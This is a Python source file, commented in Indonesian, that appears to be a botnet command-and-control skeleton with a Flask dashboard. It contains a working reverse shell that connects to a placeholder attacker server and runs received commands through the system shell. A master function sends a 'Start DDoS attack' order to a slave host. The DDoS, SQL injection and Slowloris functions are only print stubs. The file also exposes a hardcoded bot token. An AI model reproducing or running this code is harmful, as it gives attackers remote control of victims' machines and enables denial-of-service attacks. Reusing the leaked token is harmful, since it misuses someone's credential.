import socket
import random
import subprocess
import time

# Fungsi untuk mengelola bot
bot_token = "8050641668:AAEytFzgrSClXd5ARv35WFjfMNXGpGA5mr4"  # Token yang digunakan untuk otentikasi bot

def authenticate_bot(token):
    if token == bot_token:
        return True
    else:
        return False

# Fungsi untuk memantau status bot
def monitor_bot_status(bot_id):
    statuses = ['Active', 'Error', 'Timeout']
    return random.choice(statuses)

# Fungsi untuk pengelolaan bot
def manage_bot(token, bot_id):
    if authenticate_bot(token):
        status = monitor_bot_status(bot_id)
        print(f"Bot {bot_id} status: {status}")
    else:
        print(f"Bot {bot_id} authentication failed!")

# Fungsi untuk mengirim perintah ke slave
def send_command_to_slave(slave_ip, slave_port, command):
    slave = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    slave.connect((slave_ip, slave_port))
    slave.send(command.encode())
    response = slave.recv(1024).decode()
    return response

# Fungsi master C2 mengirim perintah ke slave
def master_command():
    slave_ip = "192.168.1.100"  # IP slave C2
    slave_port = 12345  # Port slave C2
    command = "Start DDoS attack"
    response = send_command_to_slave(slave_ip, slave_port, command)
    print(f"Slave Response: {response}")

# Fungsi reverse shell
def reverse_shell():
    server_ip = "YOUR_SERVER_IP"  # Ganti dengan IP server Anda
    server_port = 9999  # Port server

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, server_port))

    while True:
        command = client.recv(1024).decode('utf-8')
        if command.lower() == 'exit':
            break
        output = subprocess.run(command, shell=True, capture_output=True)
        client.send(output.stdout + output.stderr)

    client.close()

# Fungsi untuk serangan DDoS
def ddos_attack(target):
    print(f"Launching DDoS attack on {target}")

# Fungsi untuk SQL Injection
def sql_injection_attack(target):
    print(f"Launching SQL Injection on {target}")

# Fungsi untuk Slowloris
def slowloris_attack(target):
    print(f"Launching Slowloris attack on {target}")

# Fungsi untuk serangan berlapis
def attack_layered(target):
    ddos_attack(target)
    sql_injection_attack(target)
    slowloris_attack(target)

# Fungsi untuk mendeteksi platform bot
import platform
def bot_platform():
    system = platform.system()
    if system == "Linux":
        return "Linux bot"
    elif system == "Windows":
        return "Windows bot"
    elif system == "Darwin":  # macOS
        return "macOS bot"
    else:
        return "Unsupported platform"

# Web dashboard menggunakan Flask
from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/send_command', methods=['POST'])
def send_command():
    command = request.form['command']
    print(f"Command received: {command}")
    return f"Command '{command}' sent to bot!"

if __name__ == '__main__':
    app.run(debug=True)
